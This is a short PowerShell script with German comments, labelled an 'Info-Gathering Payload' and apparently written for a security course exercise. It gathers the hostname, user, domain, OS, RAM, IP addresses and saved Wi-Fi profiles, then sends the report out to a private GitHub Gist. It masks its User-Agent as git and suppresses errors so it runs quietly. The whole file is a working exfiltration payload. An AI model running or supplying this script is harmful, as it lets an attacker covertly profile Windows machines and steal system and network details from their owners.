# ============================================================
#  W02a.2 – Info-Gathering Payload
#  Autoren: Raphael Bleier, Joachim Lugger
#  Exfiltration: Privates GitHub Gist (kein lokaler Server)
#
#  Setup: GITHUB_PAT durch eigenen Token ersetzen (Scope: gist)
# ============================================================

$GITHUB_PAT = "GITHUB_PAT_HERE"

# ── Daten sammeln ────────────────────────────────────────────

$hostname = $env:COMPUTERNAME
$user     = $env:USERNAME
$domain   = $env:USERDOMAIN
$os       = (Get-WmiObject Win32_OperatingSystem).Caption
$arch     = $env:PROCESSOR_ARCHITECTURE
$ram      = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)

$ips = (Get-NetIPAddress -AddressFamily IPv4 |
        Where-Object { $_.IPAddress -notlike '127*' } |
        Select-Object -ExpandProperty IPAddress) -join ', '

$wifiProfiles = (netsh wlan show profiles) -join "`n"

$report = @"
=== INFO GATHERING | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===
Hostname : $hostname
User     : $user
Domain   : $domain
OS       : $os ($arch)
RAM (GB) : $ram
IP(s)    : $ips

=== WIFI PROFILES ===
$wifiProfiles
"@

# ── Exfil via privates GitHub Gist ──────────────────────────

$headers = @{
    "Authorization" = "token $GITHUB_PAT"
    "Content-Type"  = "application/json"
    "User-Agent"    = "git/2.40.0"
}
$body = @{
    description = "info_$(Get-Date -Format 'yyyyMMdd_HHmm')"
    public      = $false
    files       = @{ "report.txt" = @{ content = $report } }
} | ConvertTo-Json -Depth 5

try {
    Invoke-RestMethod -Uri "https://api.github.com/gists" `
        -Method POST -Headers $headers -Body $body | Out-Null
} catch { }
